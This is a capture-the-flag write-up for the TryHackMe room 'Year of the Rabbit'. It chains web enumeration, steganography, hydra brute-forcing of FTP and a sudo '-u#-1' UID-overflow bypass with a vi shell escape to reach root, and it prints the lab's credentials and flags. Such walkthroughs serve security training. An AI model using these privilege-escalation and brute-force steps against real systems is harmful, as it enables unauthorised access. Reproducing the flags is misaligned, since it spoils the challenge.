# Year of the Rabbit — TryHackMe

**Difficulty:** Easy  
**Category:** Linux / Web / Steganography  
**Date:** 14/06/2026  
**Status:** ✅ Completed

---

## 📋 Table of Contents

- [Reconnaissance](#reconnaissance)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Privilege Escalation](#privilege-escalation)
- [Flags](#flags)
- [Lessons Learned](#lessons-learned)

---

## 🔍 Reconnaissance

> Goal: identify the attack surface of the machine.

```bash
nmap -sC -sV -oN scan.txt <THM_IP_MACHINE>
```

**Open ports found:**

| Port | Service | Version |
|------|---------|---------|
| 21 | FTP | vsftpd 3.0.2 |
| 22 | SSH | OpenSSH 6.7p1 Debian |
| 80 | HTTP | Apache 2.4.10 |

**Initial observations:**
- FTP anonymous login disabled
- Web server returning the default Debian Apache page
- Page references a stylesheet at `/assets/style.css`

---

## 📡 Enumeration

> Goal: extract as much information as possible from the discovered services.

### Web — Hidden Comment in CSS

Inspecting `view-source` of the index page revealed a link to `assets/style.css`. Reading the stylesheet directly exposed a comment:

```
/* Nice to see someone checking the stylesheets.
   Take a look at the page: /sup3r_s3cr3t_fl4g.php
*/
```

### sup3r_s3cr3t_fl4g.php — JavaScript Redirect

Navigating to `/sup3r_s3cr3t_fl4g.php` triggered a JavaScript redirect to a Rick Roll video, with a `<noscript>` message hinting:

> *"Love it when people block Javascript... The hint is in the video."*

An audio cue in the video (~56 seconds in) revealed:

> *"I'll put you out of your misery [burp] you're looking in the wrong place"*

The "burp" was a hint to use **Burp Suite**.

### Intercepting the Redirect with Burp Suite

With the browser proxied through Burp (`127.0.0.1:8080`), the request to `/sup3r_s3cr3t_fl4g.php` was captured. The response contained a redirect to:

```
/intermediary.php?hidden_directory=/WExYY2Cv-qU
```

### Hidden Directory — Image Steganography

Navigating to the hidden directory revealed an indexable listing containing a single file: `Hot_Babe.png` (the classic Lena test image).

```bash
wget http://<THM_IP_MACHINE>/WExYY2Cv-qU/Hot_Babe.png
```

Inspecting the file with `cat`/`strings` revealed appended text starting at line 1792, with a message stating the username is `ftpuser` and the following lines form a password wordlist.

Extracted the wordlist:

```bash
sed -n '1792,$p' Hot_Babe.png > wordlist.txt
```

### Cracking FTP Credentials

```bash
hydra -l ftpuser -P wordlist.txt <THM_IP_MACHINE> ftp
```

**Credentials found:**

- **Username:** `ftpuser`
- **Password:** `5iez1wGXKfPKQ`

### FTP — Brainfuck-Encoded Credentials

```bash
ftp <THM_IP_MACHINE>
# Name: ftpuser
# Password: 5iez1wGXKfPKQ
ls -la
get "Eli's_Creds.txt"
```

The file contained **Brainfuck** code. Decoded via [dcode.fr/brainfuck-language](https://www.dcode.fr/brainfuck-language):

```
User: eli
Password: DSpDiM1wAEwid
```

---

## 💥 Exploitation

> Goal: gain initial access to the machine.

**Vulnerability found:** Information disclosure chain — CSS comment → JS redirect hint → Burp-intercepted hidden directory → steganographic wordlist → cracked FTP credentials → Brainfuck-encoded SSH credentials

**Tools used:** Burp Suite, hydra, dcode.fr (Brainfuck decoder)

### SSH as eli

```bash
ssh eli@<THM_IP_MACHINE>
# Password: DSpDiM1wAEwid
```

On login, a message from "Root to Gwendoline" hinted at a hidden message in a "leet s3cr3t hiding place".

**Result:** Shell obtained as `eli` ✅

---

## ⬆️ Privilege Escalation

> Goal: escalate privileges to root/Administrator.

### Stage 1 — eli → gwendoline

Searching for files matching the hint:

```bash
find / -iname "*s3cr3t*" 2>/dev/null
```

Found:
```
/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
```

The file was world-readable:

```bash
cat "/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!"
```

Contents revealed Gwendoline's password:

```
Your password is awful, Gwendoline.
Not just MniVCQVhQHUNI
```

Switched user:

```bash
su gwendoline
# Password: MniVCQVhQHUNI
```

**Result:** Shell obtained as `gwendoline` ✅

### Stage 2 — gwendoline → root

```bash
sudo -l
```

Output:
```
(ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

The `(ALL, !root)` restriction can be bypassed using a known sudo UID overflow trick (`-u#-1`), which causes the UID to wrap around to `0` (root):

```bash
sudo -u#-1 vi /home/gwendoline/user.txt
```

Inside vi, escaped to a shell:

```
:!/bin/bash
```

**Result:** Shell obtained as `root` ✅

---

## 🚩 Flags

| Flag | Location | Value |
|------|----------|-------|
| user.txt | /home/gwendoline/user.txt | `THM{1107174691af9ff3681d2b5bdb5740b1589bae53}` |
| root.txt | /root/root.txt | `THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}` |

---

## 📚 Lessons Learned

1. **CSS files and other static assets can contain hidden comments** — always check linked resources, not just the main HTML
2. **Burp Suite is essential for tracing redirects** — some information is only visible mid-redirect, before the browser follows it
3. **Image files can hide data appended after the valid file structure** — `cat`/`strings` on image files can reveal embedded text or wordlists
4. **Brainfuck and other esoteric encodings are sometimes used to obscure credentials** — online decoders make quick work of these
5. **`sudo -l` restrictions like `(ALL, !root)` can be bypassed via UID overflow (`-u#-1`)** — always check GTFOBins for the allowed binary, even with user restrictions

---

## 🛠️ Tools Used

- `nmap`
- `gobuster`
- Burp Suite
- `hydra`
- `ftp`
- `sed`
- `ssh`
- dcode.fr (Brainfuck decoder)

---

*Writeup by [GabrielMachado0](https://github.com/GabrielMachado0)*
